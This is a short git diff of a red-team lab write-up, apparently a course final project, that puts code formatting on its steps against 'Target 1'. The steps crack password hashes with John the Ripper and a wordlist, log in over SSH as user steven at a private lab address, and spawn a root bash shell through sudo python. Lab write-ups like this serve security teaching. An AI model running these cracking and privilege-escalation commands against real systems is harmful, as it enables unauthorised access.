@@ -74,7 +74,7 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
    - I created a file with the hashes and used John the Ripper to crack them
       - `john hashes.txt -wordlist=/usr/share/wordlists/dirb/big.txt`
    - From there, I connected to Steven's account and open a python shell with root privilege
-      - ssh steven@192.168.1.110
-      - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
+      - `ssh steven@192.168.1.110`
+      - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
       
 ![](https://github.com/Nhiwins/Final-Project/blob/main/Images/last%20photo.PNG)
